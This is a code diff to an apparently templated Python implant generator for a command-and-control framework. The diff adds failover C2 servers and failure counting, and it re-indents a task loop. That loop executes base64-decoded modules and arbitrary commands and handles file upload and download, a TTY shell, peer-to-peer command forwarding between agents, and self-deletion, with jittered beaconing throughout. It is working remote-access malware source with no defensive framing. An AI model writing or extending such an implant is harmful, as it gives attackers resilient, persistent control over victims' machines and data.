@@ -97,6 +97,13 @@ class {class_name}:
         self.{v_redirector_port} = {redirector_port}
         self.{v_use_redirector} = {use_redirector}
 
+        # Failover configuration
+        self.{v_use_failover} = {use_failover}
+        self.{v_failover_urls} = {failover_urls}
+        self.{v_current_c2_url} = "{c2_url}"
+        self.{v_current_fail_count} = 0
+        self.{v_max_fail_count} = 15  # Try main C2 for ~15 * heartbeat_interval before failover
+
         # Working hours and kill date configurations
         self.{v_kill_date} = "{kill_date}"
         self.{v_working_hours} = {{
@@ -145,10 +152,10 @@ class {class_name}:
 
         # Use redirector if enabled
         if self.{v_use_redirector}:
-            protocol = "https" if self.{v_c2}.startswith("https") else "http"
+            protocol = "https" if self.{v_current_c2_url}.startswith("https") else "http"
             url = protocol + "://" + self.{v_redirector_host} + ":" + str(self.{v_redirector_port}) + uri
         else:
-            url = self.{v_c2} + uri
+            url = self.{v_current_c2_url} + uri
 
         try:
             if method.upper() == 'GET':
@@ -170,6 +177,44 @@ class {class_name}:
             return None
         except Exception:
             return None
+
+    def {m_try_failover}(self):
+        if not self.{v_use_failover} or not self.{v_failover_urls}:
+            return False
+
+        # Check if we should try failover based on failure count
+        if self.{v_current_fail_count} < self.{v_max_fail_count}:
+            return False
+
+        # Try to register with a failover C2
+        for failover_url in self.{v_failover_urls}:
+            original_c2_url = self.{v_current_c2_url}
+            self.{v_current_c2_url} = failover_url
+
+            # Try to register with the failover server
+            try:
+                if self.{m_register}():
+                    print("[+] Successfully connected to failover C2: " + failover_url)
+                    self.{v_current_fail_count} = 0  # Reset failure count
+                    return True
+            except Exception as e:
+                print("[-] Failed to connect to failover C2: " + failover_url + ", error: " + str(e))
+                # Continue to the next URL
+                pass
+
+        # If all failover attempts failed, return to the original main C2
+        self.{v_current_c2_url} = original_c2_url
+        return False
+
+    def {m_increment_fail_count}(self):
+        self.{v_current_fail_count} += 1
+
+        # If we've reached the maximum fail count, try failover
+        if self.{v_current_fail_count} >= self.{v_max_fail_count}:
+            self.{m_try_failover}()
+
+    def {m_reset_fail_count}(self):
+        self.{v_current_fail_count} = 0
 
     def {m_register}(self):
         if self.{v_sandbox_enabled}:
@@ -214,8 +259,12 @@ class {class_name}:
                     self.{v_fernet} = Fernet(self.{v_secret_key}.encode())
                 except:
                     pass
+            # Reset failure count on successful registration
+            self.{m_reset_fail_count}()
             return True
         else:
+            # Increment failure count if registration failed
+            self.{m_increment_fail_count}()
             return False
 
     def {m_get_tasks}(self):
@@ -225,8 +274,13 @@ class {class_name}:
             for task in tasks:
                 if 'command' in task and self.{v_fernet}:
                     task['command'] = self.{m_decrypt_data}(task['command'])
+            # Reset failure count on successful communication
+            self.{m_reset_fail_count}()
             return tasks
-        return []
+        else:
+            # Increment failure count if communication failed
+            self.{m_increment_fail_count}()
+            return None  # Return None to indicate failure
 
     def {m_check_interactive_status}(self):
         response_data = self.{m_send}('GET', self.{v_interactive_status_uri})
@@ -388,7 +442,13 @@ class {class_name}:
             data = {{'task_id': task_id, 'result': encrypted_result}}
         else:
             data = {{'task_id': task_id, 'result': result}}
-        self.{m_send}('POST', self.{v_results_uri}, data)
+        response = self.{m_send}('POST', self.{v_results_uri}, data)
+
+        # Check if the submission was successful
+        if response and response.get('status') == 'success':
+            return True
+        else:
+            return False
 
     def {m_check_sandbox}(self):
         try:
@@ -1199,77 +1259,88 @@ class {class_name}:
 
                 if not self.{v_interactive_mode}:
                     tasks = self.{m_get_tasks}()
-                    for task in tasks:
-                        command = task.get('command', '')
-                        task_id = task.get('id', 'unknown')
+                    if tasks is not None:
+                        # Reset failure count on successful task fetch
+                        self.{m_reset_fail_count}()
+                        for task in tasks:
+                            command = task.get('command', '')
+                            task_id = task.get('id', 'unknown')
 
-                        if command.startswith('module '):
-                            try:
-                                encoded_script = command[7:]  # Remove "module " prefix
-                                decoded_script = base64.b64decode(encoded_script).decode('utf-8')
-                                result = self.{m_exec}(decoded_script)
-                            except Exception as e:
-                                result = f"[ERROR] Failed to decode and execute module: {{str(e)}}"
-                        elif command.startswith('upload '):
-                            result = self.{m_handle_upload}(command)
-                        elif command.startswith('download '):
-                            result = self.{m_handle_download}(command)
-                        elif command.startswith('tty_shell'):
-                            result = self.{m_handle_direct_shell}(command)
-                        elif command.startswith('sleep '):
-                            try:
-                                parts = command.split(' ', 1)
-                                if len(parts) == 2:
-                                    new_sleep = int(parts[1])
-                                    if new_sleep > 0:
-                                        self.{v_heartbeat} = new_sleep
-                                        result = f"[SUCCESS] Sleep interval changed to {{new_sleep}} seconds"
-                                    else:
-                                        result = "[ERROR] Sleep interval must be a positive integer"
-                                else:
-                                    result = "[ERROR] Invalid sleep command format. Usage: sleep <seconds>"
-                            except ValueError:
-                                result = "[ERROR] Sleep interval must be a valid integer"
-                            except Exception as e:
-                                result = f"[ERROR] Failed to change sleep interval: {{str(e)}}"
-                        elif command.startswith('p2p '):
-                            # Handle P2P commands: p2p list, p2p forward <target> <command>, etc.
-                            try:
-                                parts = command.split(' ', 2)  # Split into at most 3 parts: ['p2p', 'command', 'rest']
-                                if len(parts) < 2:
-                                    result = "[ERROR] Invalid P2P command format. Usage: p2p <command> [args]"
-                                else:
-                                    p2p_cmd = parts[1]
-                                    if p2p_cmd == 'list':
-                                        if self.{v_local_agents}:
-                                            agent_list = []
-                                            for addr, info in self.{v_local_agents}.items():
-                                                agent_list.append("Agent: " + str(info['agent_id']) + ", Hostname: " + str(info['hostname']) + ", Addr: " + str(addr))
-                                            result = "[P2P AGENTS]\n" + "\n".join(agent_list)
+                            if command.startswith('module '):
+                                try:
+                                    encoded_script = command[7:]  # Remove "module " prefix
+                                    decoded_script = base64.b64decode(encoded_script).decode('utf-8')
+                                    result = self.{m_exec}(decoded_script)
+                                except Exception as e:
+                                    result = f"[ERROR] Failed to decode and execute module: {{str(e)}}"
+                            elif command.startswith('upload '):
+                                result = self.{m_handle_upload}(command)
+                            elif command.startswith('download '):
+                                result = self.{m_handle_download}(command)
+                            elif command.startswith('tty_shell'):
+                                result = self.{m_handle_direct_shell}(command)
+                            elif command.startswith('sleep '):
+                                try:
+                                    parts = command.split(' ', 1)
+                                    if len(parts) == 2:
+                                        new_sleep = int(parts[1])
+                                        if new_sleep > 0:
+                                            self.{v_heartbeat} = new_sleep
+                                            result = f"[SUCCESS] Sleep interval changed to {{new_sleep}} seconds"
                                         else:
-                                            result = "[P2P] No agents discovered on local network"
-                                    elif p2p_cmd == 'forward' and len(parts) == 3:
-                                        target_addr_parts = parts[2].split(' ', 1)
-                                        if len(target_addr_parts) >= 2:
-                                            target_addr = target_addr_parts[0]
-                                            forwarded_command = target_addr_parts[1]
-                                            result = self.{m_forward_command}(target_addr, forwarded_command)
-                                        else:
-                                            result = "[ERROR] Invalid P2P forward command format. Usage: p2p forward <target_addr> <command>"
-                                    elif p2p_cmd == 'discover':
-                                        # Manually trigger discovery
-                                        self.{m_discover_local_agents}()
-                                        result = "[P2P] Discovery initiated"
+                                            result = "[ERROR] Sleep interval must be a positive integer"
                                     else:
-                                        result = "[ERROR] Unknown P2P command: " + str(p2p_cmd) + ". Available: list, forward <addr> <command>, discover"
-                            except Exception as e:
-                                result = f"[ERROR] P2P command failed: {{str(e)}}"
-                        elif command.startswith('kill'):
-                            self.{m_self_delete}()
+                                        result = "[ERROR] Invalid sleep command format. Usage: sleep <seconds>"
+                                except ValueError:
+                                    result = "[ERROR] Sleep interval must be a valid integer"
+                                except Exception as e:
+                                    result = f"[ERROR] Failed to change sleep interval: {{str(e)}}"
+                            elif command.startswith('p2p '):
+                                # Handle P2P commands: p2p list, p2p forward <target> <command>, etc.
+                                try:
+                                    parts = command.split(' ', 2)  # Split into at most 3 parts: ['p2p', 'command', 'rest']
+                                    if len(parts) < 2:
+                                        result = "[ERROR] Invalid P2P command format. Usage: p2p <command> [args]"
+                                    else:
+                                        p2p_cmd = parts[1]
+                                        if p2p_cmd == 'list':
+                                            if self.{v_local_agents}:
+                                                agent_list = []
+                                                for addr, info in self.{v_local_agents}.items():
+                                                    agent_list.append("Agent: " + str(info['agent_id']) + ", Hostname: " + str(info['hostname']) + ", Addr: " + str(addr))
+                                                result = "[P2P AGENTS]\n" + "\n".join(agent_list)
+                                            else:
+                                                result = "[P2P] No agents discovered on local network"
+                                        elif p2p_cmd == 'forward' and len(parts) == 3:
+                                            target_addr_parts = parts[2].split(' ', 1)
+                                            if len(target_addr_parts) >= 2:
+                                                target_addr = target_addr_parts[0]
+                                                forwarded_command = target_addr_parts[1]
+                                                result = self.{m_forward_command}(target_addr, forwarded_command)
+                                            else:
+                                                result = "[ERROR] Invalid P2P forward command format. Usage: p2p forward <target_addr> <command>"
+                                        elif p2p_cmd == 'discover':
+                                            # Manually trigger discovery
+                                            self.{m_discover_local_agents}()
+                                            result = "[P2P] Discovery initiated"
+                                        else:
+                                            result = "[ERROR] Unknown P2P command: " + str(p2p_cmd) + ". Available: list, forward <addr> <command>, discover"
+                                except Exception as e:
+                                    result = f"[ERROR] P2P command failed: {{str(e)}}"
+                            elif command.startswith('kill'):
+                                self.{m_self_delete}()
+                            else:
+                                result = self.{m_exec}(command)
+
+                        # Submit task result with failover handling
+                        submission_success = self.{m_submit}(task_id, result)
+                        if submission_success:
+                            # Reset failure count on successful result submission
+                            self.{m_reset_fail_count}()
                         else:
-                            result = self.{m_exec}(command)
-
-                        self.{m_submit}(task_id, result)
+                            # Increment failure count if submission fails
+                            self.{m_increment_fail_count}()
+                            print(f"[-] Failed to submit task result for task {{task_id}}")
 
                 if self.{v_interactive_mode}:
                     sleep_time = 2
@@ -1277,6 +1348,10 @@ class {class_name}:
                     base_sleep = self.{v_heartbeat}
                     jitter_factor = (random.random() - 0.5) * 2 * self.{v_jitter}
                     sleep_time = max(5, base_sleep * (1 + jitter_factor))
+
+                # If no tasks were fetched (None was returned), increment failure count
+                if tasks is None:
+                    self.{m_increment_fail_count}()
 
                 time.sleep(sleep_time)
 
